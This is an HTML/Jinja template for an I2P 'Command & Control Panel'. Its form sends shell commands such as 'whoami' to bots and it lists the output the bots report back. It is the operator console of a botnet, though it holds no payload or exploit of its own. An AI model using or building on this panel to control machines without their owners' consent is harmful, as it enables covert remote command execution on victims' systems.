<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>C2 Panel - I2P</title>

  <!-- Bootstrap 5 -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"/>

  <!-- Animate.css for smooth fade-in -->
  <link href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" rel="stylesheet"/>

  <!-- Dark Theme Custom CSS -->
  <style>
    body {
      background-color: #0e0e0e;
      color: #f8f9fa;
      font-family: 'Segoe UI', sans-serif;
    }
    .navbar {
      background-color: #1a1a1a;
    }
    .card {
      background-color: #1f1f1f;
      border: none;
    }
    .form-control, .btn {
      border-radius: 0.375rem;
    }
    pre {
      white-space: pre-wrap;
      word-wrap: break-word;
      background: #101010;
      padding: 0.75rem;
      border-radius: 5px;
    }
    .fade-in {
      animation: fadeInUp 0.8s ease-in-out;
    }
  </style>
</head>
<body>
  <nav class="navbar navbar-dark px-3 mb-4">
    <span class="navbar-brand h4 animate__animated animate__fadeInDown">üïµÔ∏è‚Äç‚ôÇÔ∏è I2P Command & Control Panel</span>
  </nav>

  <div class="container">
    <div class="row">
      <!-- Command Form -->
      <div class="col-lg-4 mb-4 animate__animated animate__fadeInLeft">
        <div class="card p-4 shadow">
          <h4 class="mb-3">üì§ Send Command</h4>
          <form method="POST" action="/send_command">
            <input type="text" name="command" class="form-control mb-3" placeholder="e.g., whoami" required/>
            <button class="btn btn-primary w-100">Send</button>
          </form>
        </div>
      </div>

      <!-- Bot Output -->
      <div class="col-lg-8 animate__animated animate__fadeInRight">
        <div class="card p-4 shadow">
          <h4 class="mb-3">üì• Bot Responses</h4>
          {% if bots %}
            {% for bot in bots %}
              <div class="mb-3 fade-in">
                <h6 class="text-warning">üñ•Ô∏è {{ bot[1] | e }}</h6>
                <pre>{{ bot[2] | e }}</pre>
                <hr style="background-color: #444;" />
              </div>
            {% endfor %}
          {% else %}
            <p class="text-muted">No bots have reported yet.</p>
          {% endif %}
        </div>
      </div>
    </div>
  </div>

  <!-- Bootstrap JS (optional) -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
